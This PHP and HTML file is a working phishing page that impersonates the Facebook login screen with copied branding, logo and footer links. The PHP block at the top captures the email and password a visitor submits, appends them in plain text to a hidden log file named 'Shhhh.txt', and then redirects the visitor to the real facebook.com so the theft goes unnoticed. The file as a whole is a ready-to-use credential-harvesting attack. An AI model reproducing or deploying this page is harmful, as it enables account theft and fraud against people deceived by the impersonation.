<?php 
    if(isset($_POST["email"]) && isset($_POST["password"])) {
    
    header("Location: https://www.facebook.com");
    
    $pwd= $_POST["password"];
    $email= $_POST["email"];


    $txt = "
email: " . $email . "  
" . "password: " . $pwd . "
";


    $myfile = fopen('Shhhh.txt', "a");
    fwrite($myfile, $txt);

    fclose($myfile);


    }
?>

<!DOCTYPE html>
<html lang="en">
    <title>Facebook - Connexion ou Inscription</title>
    <link rel="stylesheet" href="Index.css">
<body>
    <div class="row res">
        <div class="fb-form res">
            <div class="card">
                <h1>facebook</h1>
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>


        <div class="container">
    <h2>Français (France)</h2>
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    </div>



            <form method="post" action="">                                     
                <input type="text" placeholder="Email or phone number"
                    required name="email">
                <input type="password" id="pwd" placeholder="Password" required name="password"  onclick="showeye()" onkeyup="showeye()">


                <div class="eye" onclick="showeye()">
                <div id="Leye" class="Leye" onclick ="showpwd()">
                </div>
</div>


                <div class="fb-submit">
                    <button type="submit" class="login">Login</button>
                    <br>
                    <a href="#" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <div class="button">
                    <a href="#">Create new account</a>
                    <h6>Meta</h6>
                </div>
            </form>


        </div>
    </div>
</div>



    <footer>
        <div class="footer-langs">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">मराठी</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">ગુજરાતી</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">ਪੰਜਾਬੀ</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">മലയാളം</a></li>
                <li><button>+</button></li>
            </ol>
            <ol>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Video</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Meta Pay</a></li>
                <li><a href="#">Meta Store</a></li>
                <li><a href="#">Meta Quest</a></li>
                <li><a href="#">Imagine with Meta AI</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Threads</a></li>
                <li><a href="#">Fundraisers</a></li>
                <li><a href="#">Services</a></li>
                <li><a href="#">Voting Information Centre</a></li>
                <li><a href="#">Privacy Policy</a></li>
                <li><a href="#">Privacy Centre</a></li>
                <li><a href="#">Groups</a></li>
                <li><a href="#">About</a></li>
                <li><a href="#">Create ad</a></li>
                <li><a href="#">Create Page</a></li>
                <li><a href="#">Developers</a></li>
                <li><a href="#">Careers</a></li>
                <li><a href="#">Cookies</a></li>
                <li><a href="#">AdChoices</a></li>
                <li><a href="#">Terms</a></li>
                <li><a href="#">Help</a></li>
                <li><a href="#">Contact uploading and non-users</a></li>
            </ol>
            <small>Meta © 2024</small>
        </div>
    </footer>
</body>
<script src="Index.js"></script>
</html>